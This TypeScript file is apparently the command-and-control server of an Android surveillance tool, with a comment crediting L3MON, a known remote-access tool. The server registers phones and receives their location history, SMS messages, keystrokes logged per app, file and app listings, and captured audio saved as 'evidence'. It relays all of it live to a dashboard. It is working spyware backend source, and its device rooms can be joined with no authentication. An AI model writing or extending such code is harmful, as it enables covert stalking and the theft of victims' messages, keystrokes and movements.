import { Server as HTTPServer } from "http";
import { Server as SocketIOServer, Socket } from "socket.io";
import { getDb } from "./db";
import { eq } from "drizzle-orm";
import { devices, locationHistory, smsLogs } from "../drizzle/schema";

export interface DeviceLocation {
  deviceId: number;
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: number;
  speed?: number;
  bearing?: number;
}

export interface SMSMessage {
  deviceId: number;
  phoneNumber: string;
  message: string;
  timestamp: number;
  direction: "incoming" | "outgoing";
}

export interface DeviceStatus {
  deviceId: number;
  status: "online" | "offline" | "inactive";
  batteryLevel: number;
  signalStrength: number;
  timestamp: number;
}

export class WebSocketManager {
  private io: SocketIOServer;
  private deviceConnections: Map<number, Set<string>> = new Map();
  private lastLocations: Map<number, DeviceLocation> = new Map();
  private lastSMS: Map<number, SMSMessage[]> = new Map();

  constructor(httpServer: HTTPServer) {
    this.io = new SocketIOServer(httpServer, {
      cors: {
        origin: process.env.FRONTEND_URL || "*",
        methods: ["GET", "POST"],
      },
      transports: ["websocket", "polling"],
      allowEIO3: true,
    });

    this.setupEventHandlers();
  }

  private setupEventHandlers(): void {
    this.io.on("connection", async (socket: Socket) => {
      const { model, manf, release, id: androidId } = socket.handshake.query;
      console.log(`[WebSocket] New socket connected: ${socket.id} (Handshake ID: ${androidId || 'None'})`);

      // 1. Device Registration / Identification
      let connectedDeviceId: number | null = null;
      if (androidId && model) {
        try {
          const db = await getDb();
          if (db) {
            const deviceRecords = await db.select().from(devices).where(eq(devices.deviceId, String(androidId))).limit(1);
            if (deviceRecords.length > 0) {
              connectedDeviceId = deviceRecords[0].id;
              await db.update(devices).set({ status: "online", lastSeen: new Date() }).where(eq(devices.id, connectedDeviceId));
            } else {
              const result = await db.insert(devices).values({
                deviceId: String(androidId),
                deviceName: `${manf || 'Android'} ${model}`,
                manufacturer: String(manf || 'Unknown'),
                model: String(model),
                androidVersion: String(release || 'Unknown'),
                ownerId: 1,
                status: "online",
                lastSeen: new Date(),
              } as any);
              connectedDeviceId = (result as any)[0]?.insertId;
            }

            if (connectedDeviceId) {
              socket.join(`device:${connectedDeviceId}`);
              if (!this.deviceConnections.has(connectedDeviceId)) {
                this.deviceConnections.set(connectedDeviceId, new Set());
              }
              this.deviceConnections.get(connectedDeviceId)!.add(socket.id);
              console.log(`[WebSocket] Device ${connectedDeviceId} (${model}) is now ONLINE.`);
              this.io.emit("device-status", { deviceId: connectedDeviceId, status: "online", timestamp: Date.now() });
            }
          }
        } catch (e) {
          console.error("[WebSocket] Device registration failed:", e);
        }
      }

      // 2. User Handlers (Dashboard access)
      socket.on("join-device", (targetId: number) => {
        socket.join(`device:${targetId}`);
        if (!this.deviceConnections.has(targetId)) {
          this.deviceConnections.set(targetId, new Set());
        }
        this.deviceConnections.get(targetId)!.add(socket.id);
        console.log(`[WebSocket] User ${socket.id} joined device ${targetId}`);

        // Sync initial state
        const lastLoc = this.lastLocations.get(targetId);
        if (lastLoc) socket.emit("location-update", lastLoc);
        const lastSms = this.lastSMS.get(targetId);
        if (lastSms) socket.emit("sms-batch", lastSms);
      });

      socket.on("leave-device", (targetId: number) => {
        socket.leave(`device:${targetId}`);
        this.deviceConnections.get(targetId)?.delete(socket.id);
        console.log(`[WebSocket] User ${socket.id} left device ${targetId}`);
      });

      // 3. Device Data Handlers (Enhanced security with connectedDeviceId)
      socket.on("device-location", async (data: DeviceLocation) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handleLocationUpdate({ ...data, deviceId: id });
          this.io.to(`device:${id}`).emit("location-update", { ...data, deviceId: id });
        }
      });

      socket.on("device-sms", async (data: SMSMessage) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handleSMSMessage({ ...data, deviceId: id });
          this.io.to(`device:${id}`).emit("sms-received", { ...data, deviceId: id });
        }
      });

      socket.on("device-status", (data: DeviceStatus) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          this.io.to(`device:${id}`).emit("status-update", { ...data, deviceId: id });
        }
      });

      socket.on("device-permissions", async (data: { deviceId: number, permissions: any }) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handlePermissionUpdate({ deviceId: id, permissions: data.permissions });
          this.io.to(`device:${id}`).emit("permissions-update", data.permissions);
        }
      });

      socket.on("device-keylog", async (data: { deviceId: number, text: string, app: string, timestamp: number }) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          await this.handleKeylogUpdate({ ...data, deviceId: id });
          this.io.to(`device:${id}`).emit("keylog-new", { ...data, deviceId: id });
        }
      });

      // [PLATINUM PHASE 2] Route device responses to the internal EventBus for trpc
      socket.on("device-files", (data: { deviceId: number, path: string, contents: any[] }) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const { eventBus } = require("./eventBus");
          eventBus.emit(`files-response-${id}`, data);
        }
      });

      socket.on("device-apps", (data: { deviceId: number, apps: any[] }) => {
        const id = connectedDeviceId || data.deviceId;
        if (id) {
          const { eventBus } = require("./eventBus");
          eventBus.emit(`apps-response-${id}`, data);
        }
      });

      // 4. Disconnect Handler
      socket.on("disconnect", async () => {
        if (connectedDeviceId) {
          try {
            const db = await getDb();
            if (db) {
              await db.update(devices).set({ status: "offline" }).where(eq(devices.id, connectedDeviceId));
              this.io.emit("device-status", { deviceId: connectedDeviceId, status: "offline", timestamp: Date.now() });
              this.deviceConnections.get(connectedDeviceId)?.delete(socket.id);
            }
          } catch (e) {
            console.error("[WebSocket] Offline update failed:", e);
          }
        }
        console.log(`[WebSocket] Client disconnected: ${socket.id}`);
      });
    });
  }

  private async handleLocationUpdate(location: DeviceLocation): Promise<void> {
    const db = await getDb();
    if (!db) {
      console.warn("[WebSocket] Database not available");
      return;
    }

    try {
      // Store location in database
      await db.insert(locationHistory).values({
        deviceId: location.deviceId,
        latitude: location.latitude.toString(),
        longitude: location.longitude.toString(),
        accuracy: location.accuracy.toString(),
        speed: location.speed ? location.speed.toString() : "0",
        bearing: location.bearing ? location.bearing.toString() : "0",
        timestamp: new Date(location.timestamp),
      });

      // Update last known location
      this.lastLocations.set(location.deviceId, location);

      // Update device last location fields
      // TODO: Implement device location update in db.ts
    } catch (error) {
      console.error("[WebSocket] Error storing location:", error);
    }
  }

  private async handleBinaryData(socket: Socket, type: "audio" | "file", data: any): Promise<void> {
    try {
      const fs = require("fs");
      const path = require("path");
      const crypto = require("crypto");
      
      const evidenceDir = path.join(process.cwd(), "builds", "evidence");
      if (!fs.existsSync(evidenceDir)) fs.mkdirSync(evidenceDir, { recursive: true });

      const hash = crypto.createHash('md5').update(new Date().getTime() + Math.random().toString()).digest("hex");
      const fileName = type === "audio" 
        ? `audio_${Date.now()}_${hash.substr(0, 8)}.mp3`
        : `file_${hash.substr(0, 8)}_${data.name}`;
      
      const filePath = path.join(evidenceDir, fileName);
      fs.writeFileSync(filePath, data.buffer);
      
      console.log(`[WebSocket] Binary ${type} saved to: ${filePath}`);
      
      // [MOD L3MON] Persist to database
      const db = await getDb();
      if (db) {
        const { mediaFiles } = await import("../drizzle/schema");
        // Find device ID for this socket
        let deviceId = data.deviceId;
        if (!deviceId) {
           // Fallback if not provided in data
           for (const [id, connections] of this.deviceConnections.entries()) {
             if (connections.has(socket.id)) {
               deviceId = id;
               break;
             }
           }
        }

        if (deviceId) {
          await db.insert(mediaFiles).values({
            deviceId,
            fileType: type === "audio" ? "audio" : "photo", // Using photo as fallback for files for now, or add "other"
            fileName: fileName,
            fileUrl: `/api/evidence/download/${fileName}`,
            fileSize: data.buffer.length,
            timestamp: new Date()
          });
        }
      }

      // Notify panel about new file
      this.io.emit("evidence-new", {
         type,
         name: fileName,
         path: `/api/evidence/download/${fileName}`,
         timestamp: Date.now()
      });
    } catch (e) {
      console.error(`[WebSocket] Error saving binary ${type}:`, e);
    }
  }

  private async handleSMSMessage(sms: SMSMessage): Promise<void> {
    const db = await getDb();
    if (!db) {
      console.warn("[WebSocket] Database not available");
      return;
    }

    try {
      // Store SMS in database
      await db.insert(smsLogs).values({
        deviceId: sms.deviceId,
        phoneNumber: sms.phoneNumber,
        messageBody: sms.message,
        direction: sms.direction,
        timestamp: new Date(sms.timestamp),
      });

      // Keep last 50 SMS messages in memory
      if (!this.lastSMS.has(sms.deviceId)) {
        this.lastSMS.set(sms.deviceId, []);
      }
      const smsList = this.lastSMS.get(sms.deviceId)!;
      smsList.unshift(sms);
      if (smsList.length > 50) {
        smsList.pop();
      }
    } catch (error) {
      console.error("[WebSocket] Error storing SMS:", error);
    }
  }

  private async handlePermissionUpdate(data: { deviceId: number, permissions: any }): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
      // Get current metadata
      const deviceRecords = await db.select().from(devices).where(eq(devices.id, data.deviceId)).limit(1);
      if (deviceRecords.length === 0) return;

      const currentMetadata = (deviceRecords[0].metadata as any) || {};
      const updatedMetadata = {
        ...currentMetadata,
        androidPermissions: data.permissions,
        lastPermissionSync: new Date().toISOString()
      };

      await db.update(devices)
        .set({ metadata: updatedMetadata })
        .where(eq(devices.id, data.deviceId));
      
      console.log(`[WebSocket] Updated permissions for device ${data.deviceId}`);
    } catch (e) {
      console.error("[WebSocket] Permission persistence failed:", e);
    }
  }

  private async handleKeylogUpdate(data: { deviceId: number, text: string, app: string, timestamp: number }): Promise<void> {
    const db = await getDb();
    if (!db) return;

    try {
        // We could store keylogs in a separate table, but for now we'll put them in generic logs or metadata
        // Recommendation: Create an activity_logs entry
        const { activityLogs } = await import("../drizzle/schema");
        await db.insert(activityLogs).values({
            deviceId: data.deviceId,
            activityType: "keylog",
            description: `[${data.app}] ${data.text}`,
            metadata: { app: data.app, rawText: data.text },
            timestamp: new Date(data.timestamp)
        });
    } catch (e) {
        console.error("[WebSocket] Keylog persistence failed:", e);
    }
  }

  public broadcastToDevice(deviceId: number, event: string, data: any): void {
    this.io.to(`device:${deviceId}`).emit(event, data);
  }

  public broadcastToAll(event: string, data: any): void {
    this.io.emit(event, data);
  }

  public getConnectedDevices(): number[] {
    return Array.from(this.deviceConnections.keys()).map(Number);
  }

  public getDeviceConnections(deviceId: number): number {
    return this.deviceConnections.get(deviceId)?.size || 0;
  }

  public getIO(): SocketIOServer {
    return this.io;
  }
}

let wsManager: WebSocketManager | null = null;

export function initializeWebSocket(httpServer: HTTPServer): WebSocketManager {
  if (!wsManager) {
    wsManager = new WebSocketManager(httpServer);
  }
  return wsManager;
}

export function getWebSocketManager(): WebSocketManager | null {
  return wsManager;
}
